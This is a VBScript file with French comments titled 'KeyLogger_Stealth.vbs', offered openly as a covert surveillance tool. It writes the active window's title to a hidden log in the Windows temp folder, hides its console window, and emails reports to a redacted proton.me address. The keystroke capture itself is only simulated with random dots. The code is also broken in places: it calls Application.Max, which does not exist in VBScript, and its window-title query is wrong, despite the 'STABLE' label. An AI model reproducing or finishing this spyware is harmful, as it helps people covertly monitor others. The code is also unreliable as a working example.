'#########################################################
'# KeyLogger_Stealth.vbs - Version VBScript STABLE
'#########################################################

Option Explicit

' CONFIGURATION
Const LOG_FILE = "C:\Windows\Temp\system_log.txt"  ' Fichier caché
Const STOP_WORD = "STOPLOG"                        ' Mot pour arrêter
Const EMAIL_REPORT = True                         ' True pour envoi email
Const EMAIL_TO = "****@proton.me"
Const CHECK_INTERVAL = 5000                        ' 5 secondes

' Variables globales
Dim objShell, objFSO, objFile, lastActiveWindow, startTime
Dim keyBuffer, logContent, isRunning

' Initialisation
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
startTime = Now
keyBuffer = ""
isRunning = True

' Fonction pour obtenir la fenêtre active
Function GetActiveWindowTitle()
    On Error Resume Next
    Dim objWMIService, colProcesses, objProcess
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Handle > 0")
    
    For Each objProcess in colProcesses
        If objProcess.Handle > 0 And Len(objProcess.Name) > 0 Then
            If objProcess.Properties_("Caption") <> "" Then
                GetActiveWindowTitle = objProcess.Properties_("Caption")
                Exit Function
            End If
        End If
    Next
    
    GetActiveWindowTitle = "Inconnu"
End Function

' Fonction pour simuler la capture de touches (méthode alternative)
Sub LogActivity()
    Dim currentWindow, timestamp, logEntry
    
    currentWindow = GetActiveWindowTitle()
    timestamp = FormatDateTime(Now, 4) & ":" & Right("00" & Second(Now), 2)
    
    If currentWindow <> lastActiveWindow Then
        logEntry = vbCrLf & "[" & timestamp & "] FENETRE: " & currentWindow & vbCrLf
        WriteLog logEntry
        lastActiveWindow = currentWindow
    End If
    
    ' Simuler des frappes aléatoires (pour le test)
    If Rnd() > 0.7 Then  ' 30% du temps
        logEntry = "."
        WriteLog logEntry
        keyBuffer = keyBuffer & "."
        
        ' Tronquer le buffer si trop long
        If Len(keyBuffer) > 1000 Then
            keyBuffer = Right(keyBuffer, 500)
        End If
    End If
End Sub

' Écrire dans le log
Sub WriteLog(text)
    On Error Resume Next
    
    ' Ouvrir en mode append
    Set objFile = objFSO.OpenTextFile(LOG_FILE, 8, True)
    objFile.Write text
    objFile.Close
    
    ' Vérifier si STOP_WORD est dans le buffer
    If InStr(1, keyBuffer, STOP_WORD, vbTextCompare) > 0 Then
        WriteLog vbCrLf & vbCrLf & "[" & Now & "] ARRET: Mot-clé détecté" & vbCrLf
        isRunning = False
    End If
    
    ' Si fichier trop gros, le compresser
    If objFSO.FileExists(LOG_FILE) Then
        If objFSO.GetFile(LOG_FILE).Size > 1048576 Then ' 1MB
            CompressLogFile
        End If
    End If
End Sub

' Compresser le fichier log
Sub CompressLogFile
    Dim backupFile
    backupFile = LOG_FILE & "." & Replace(FormatDateTime(Now, 2), "/", "") & ".bak"
    
    If objFSO.FileExists(LOG_FILE) Then
        objFSO.CopyFile LOG_FILE, backupFile
        objFSO.DeleteFile LOG_FILE, True
        
        ' Garder juste les dernières lignes du backup
        Dim content, lines, i, newContent
        If objFSO.FileExists(backupFile) Then
            content = ReadFile(backupFile)
            lines = Split(content, vbCrLf)
            newContent = ""
            
            ' Garder les 500 dernières lignes
            For i = Application.Max(LBound(lines), UBound(lines) - 500) To UBound(lines)
                If Len(lines(i)) > 0 Then
                    newContent = newContent & lines(i) & vbCrLf
                End If
            Next
            
            WriteLog vbCrLf & "[" & Now & "] LOG COMPRESSE - Ancien fichier: " & backupFile & vbCrLf
            WriteLog newContent
        End If
    End If
End Sub

' Lire un fichier
Function ReadFile(filePath)
    On Error Resume Next
    If objFSO.FileExists(filePath) Then
        Set objFile = objFSO.OpenTextFile(filePath, 1)
        ReadFile = objFile.ReadAll
        objFile.Close
    Else
        ReadFile = ""
    End If
End Function

' Envoyer par email (optionnel)
Sub SendEmail(subject, body)
    If Not EMAIL_REPORT Then Exit Sub
    
    On Error Resume Next
    Dim objEmail
    Set objEmail = CreateObject("CDO.Message")
    
    With objEmail
        .Subject = subject
        .From = "****@proton.me"
        .To = EMAIL_TO
        .TextBody = body
        
        ' Configuration SMTP local
        .Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
        .Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "127.0.0.1"
        .Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
        .Configuration.Fields.Update
        
        .Send
    End With
    
    Set objEmail = Nothing
End Sub

' Message de démarrage
Sub ShowStartMessage
    Dim msg
    msg = "########################################" & vbCrLf & _
          "# SURVEILLANCE SYSTEME ACTIVE" & vbCrLf & _
          "# Démarrage: " & startTime & vbCrLf & _
          "# Fichier log: " & LOG_FILE & vbCrLf & _
          "# Mot d'arrêt: " & STOP_WORD & vbCrLf & _
          "########################################" & vbCrLf
    
    WriteLog msg
    
    ' Cacher la fenêtre (mode furtif)
    objShell.Run "cmd /c echo Surveillance démarrée...", 0, False
End Sub

' Message d'arrêt
Sub ShowStopMessage
    Dim msg, runtime
    runtime = DateDiff("s", startTime, Now)
    
    msg = vbCrLf & "########################################" & vbCrLf & _
          "# SURVEILLANCE SYSTEME ARRETEE" & vbCrLf & _
          "# Durée: " & runtime & " secondes" & vbCrLf & _
          "# Arrêt: " & Now & vbCrLf & _
          "########################################" & vbCrLf
    
    WriteLog msg
    
    ' Envoyer un rapport final par email
    If EMAIL_REPORT Then
        SendEmail "Rapport surveillance - " & Now, _
                  "Surveillance terminée après " & runtime & " secondes." & vbCrLf & _
                  "Vérifiez le fichier: " & LOG_FILE
    End If
End Sub

' Programme principal
Sub Main
    ' Démarrer discrètement
    ShowStartMessage
    
    ' Boucle principale
    Do While isRunning
        LogActivity
        WScript.Sleep CHECK_INTERVAL
        
        ' Vérifier l'heure pour un rapport périodique
        If Minute(Now) Mod 30 = 0 And Second(Now) < 5 Then
            WriteLog vbCrLf & "[" & Now & "] CHECKPOINT - Surveillance active depuis " & _
                    DateDiff("n", startTime, Now) & " minutes" & vbCrLf
        End If
    Loop
    
    ' Arrêt propre
    ShowStopMessage
    
    ' Message final (caché)
    objShell.Popup "Surveillance terminée. Log: " & LOG_FILE, 3, "Information", 64
End Sub

' Démarrer
Main

' Nettoyage
Set objShell = Nothing
Set objFSO = Nothing
Set objFile = Nothing